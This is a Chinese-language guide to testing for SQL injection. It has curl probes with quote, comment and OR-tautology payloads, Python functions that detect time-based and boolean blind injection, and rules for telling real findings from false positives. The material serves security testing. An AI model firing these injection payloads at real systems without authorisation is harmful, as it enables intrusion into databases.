# SQL注入测试

## 测试方法

### 1. 基础探测

```
# 单引号测试
curl "http://api/user?id=1'"

# 注释测试
curl "http://api/user?id=1--"

# OR测试
curl "http://api/user?id=1' OR '1'='1"
```

### 2. SQL注入类型判断

```python
def analyze_sqli_type(response):
    """
    1. 判断是否是MyBatis配置错误
    """
    if "ibator" in response or "mybatis" in response.lower():
        if "#{" in response or "${" in response:
            return {
                "type": "MyBatis参数化配置不当(非注入)",
                "risk": "低",
                "suggestion": "后端使用了${}但框架层面有防护"
            }

    """
    2. 判断是否是SQL注入
    """
    if "sql" in response.lower() and "error" in response.lower():
        return {
            "type": "SQL注入",
            "risk": "高",
            "suggestion": "存在SQL注入漏洞"
        }

    """
    3. 判断是否可利用
    """
    return {"type": "需要进一步测试", "risk": "未知"}
```

### 3. 盲注测试

```python
# 时间盲注
def time_blind_sqli(url, param):
    payloads = [
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
    ]
    for payload in payloads:
        start = time.time()
        r = requests.get(url + "?" + param + "=" + payload)
        if time.time() - start >= 5:
            return True  # 确认时间盲注
    return False

# 布尔盲注
def boolean_blind_sqli(url, param):
    payloads = [
        "1' AND 1=1--",
        "1' AND 1=2--",
    ]
    r1 = requests.get(url + "?" + param + "=" + payloads[0])
    r2 = requests.get(url + "?" + param + "=" + payloads[1])
    if r1.text != r2.text:
        return True  # 确认布尔盲注
    return False
```

## 误报判断

```
【真实漏洞特征】
- 响应包含SQL错误信息
- 响应内容与正常响应有明确差异
- 时间盲注确认延时生效

【误报特征】
- 只是URL编码差异
- 响应与正常完全相同
- WAF拦截页面
```

## 判断步骤

```bash
# 1. 获取正常响应
curl -s "http://api/user?id=1" > normal.txt

# 2. 测试注入
curl -s "http://api/user?id=1'" > sqli.txt

# 3. 对比差异
diff normal.txt sqli.txt

# 4. 检查SQL错误关键字
grep -i "sql\|error\|mysql\|postgresql\|oracle" sqli.txt
```
